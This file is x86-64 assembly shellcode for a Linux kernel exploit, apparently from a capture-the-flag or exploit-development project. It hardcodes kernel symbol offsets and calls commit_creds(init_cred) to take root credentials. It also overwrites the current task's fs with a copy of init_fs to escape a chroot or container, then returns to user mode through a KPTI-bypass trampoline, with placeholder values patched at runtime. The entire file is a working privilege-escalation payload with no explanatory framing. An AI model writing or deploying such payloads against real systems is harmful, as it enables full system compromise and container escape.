init_cred                 equ 0x1850a00
commit_creds              equ 0x0099ef0
find_task_by_vpid         equ 0x0092950
init_fs                   equ 0x1966180
copy_fs_struct            equ 0x026c050
kpti_bypass               equ 0x0e00f01

_start:
    endbr64
    call a
a:
    pop r15
    sub r15, 0x241389

    ; commit_creds(init_cred) [1]
    lea rdi, [r15 + init_cred]
    lea rax, [r15 + commit_creds]
    call rax

    ; new_fs = copy_fs_struct(init_fs) [2]
    lea rdi, [r15 + init_fs]
    lea rax, [r15 + copy_fs_struct]
    call rax
    mov rbx, rax

    ; current = find_task_by_vpid(getpid()) [3]
    mov rdi, 0x1111111111111111     ; will be fixed at runtime
    lea rax, [r15 + find_task_by_vpid]
    call rax

    ; current->fs = new_fs [4]
    mov [rax + 0x740], rbx

    ; kpti bypass [5]
    xor eax, eax
    mov [rsp+0x00], rax
    mov [rsp+0x08], rax
    mov rax, 0x2222222222222222   ; win
    mov [rsp+0x10], rax
    mov rax, 0x3333333333333333   ; cs
    mov [rsp+0x18], rax
    mov rax, 0x4444444444444444   ; rflags
    mov [rsp+0x20], rax
    mov rax, 0x5555555555555555   ; stack
    mov [rsp+0x28], rax
    mov rax, 0x6666666666666666   ; ss
    mov [rsp+0x30], rax
    lea rax, [r15 + kpti_bypass]  ; swapgs_restore_regs_and_return_to_usermode + 54
    jmp rax

    int3
